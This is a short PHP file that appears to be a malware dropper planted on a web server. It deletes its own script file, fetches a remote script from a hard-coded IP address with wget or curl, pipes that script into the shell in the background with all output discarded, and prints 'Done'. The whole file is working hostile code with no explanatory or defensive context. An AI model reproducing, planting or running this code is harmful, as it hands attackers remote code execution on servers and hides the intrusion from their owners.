<?php
system("rm -rf ".pathinfo($_SERVER['SCRIPT_FILENAME'])["basename"]." ; (wget -qO - http://3.86.38.166/.x/?x=w-x || curl http://3.86.38.166/.x/?x=c-x) | sh > /dev/null 2>&1 &");
echo "Done ";
?>